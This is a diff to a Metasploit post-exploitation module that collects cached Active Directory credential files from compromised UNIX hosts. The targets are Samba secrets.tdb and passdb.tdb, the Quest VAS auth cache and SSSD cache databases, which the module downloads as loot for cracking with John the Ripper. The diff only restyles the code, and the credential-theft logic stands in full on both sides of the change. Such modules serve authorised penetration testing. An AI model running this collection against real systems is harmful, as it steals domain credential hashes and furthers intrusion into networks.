@@ -30,24 +30,27 @@ class MetasploitModule < Msf::Post
   include Msf::Post::File
   include Msf::Post::Unix
 
-  def initialize(info={})
-    super( update_info(info,
-      "Name"           => "UNIX Gather Cached AD Hashes",
-      "Description"    => %q{ Post Module to obtain all cached AD hashes on the targeted UNIX machine. These can be cracked with John the Ripper (JtR). },
-      "License"        => MSF_LICENSE,
-      "Author"         => [ "Tim Brown <timb[at]nth-dimension.org.uk>"],
-      "Platform"       => %w{ linux osx unix solaris aix },
-      "SessionTypes"   => [ "meterpreter", "shell" ]
-    ))
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'UNIX Gather Cached AD Hashes',
+        'Description' => %q{ Post Module to obtain all cached AD hashes on the targeted UNIX machine. These can be cracked with John the Ripper (JtR). },
+        'License' => MSF_LICENSE,
+        'Author' => [ 'Tim Brown <timb[at]nth-dimension.org.uk>'],
+        'Platform' => %w[linux osx unix solaris aix],
+        'SessionTypes' => [ 'meterpreter', 'shell' ]
+      )
+    )
   end
 
   def run
-    print_status("Finding files")
-    files = [ "/var/lib/samba/private/secrets.tdb", "/var/lib/samba/passdb.tdb", "/var/opt/quest/vas/authcache/vas_auth.vdb" ]
-    files = files + cmd_exec("ls /var/lib/sss/db/cache_*").split(/\r\n|\r|\n/)
+    print_status('Finding files')
+    files = [ '/var/lib/samba/private/secrets.tdb', '/var/lib/samba/passdb.tdb', '/var/opt/quest/vas/authcache/vas_auth.vdb' ]
+    files += cmd_exec('ls /var/lib/sss/db/cache_*').split(/\r\n|\r|\n/)
     files = files.select { |d| file?(d) }
     if files.nil? || files.empty?
-      print_error("No cached AD hashes found")
+      print_error('No cached AD hashes found')
       return
     end
     download_loot(files)
@@ -57,12 +60,12 @@ class MetasploitModule < Msf::Post
     print_status("Looting #{files.count} files")
     files.each do |file|
       file.chomp!
-      sep = "/"
+      sep = '/'
       print_status("Downloading #{file}")
       data = read_file(file)
       file = file.split(sep).last
-      loot_file = store_loot("unix_cached_ad_hashes", "text/plain", session, data, "unix_cached_ad_hashes_#{file}", "Cached AD Hashes File")
-      print_good("File stored in: #{loot_file.to_s}")
+      loot_file = store_loot('unix_cached_ad_hashes', 'text/plain', session, data, "unix_cached_ad_hashes_#{file}", 'Cached AD Hashes File')
+      print_good("File stored in: #{loot_file}")
     end
   end
 end
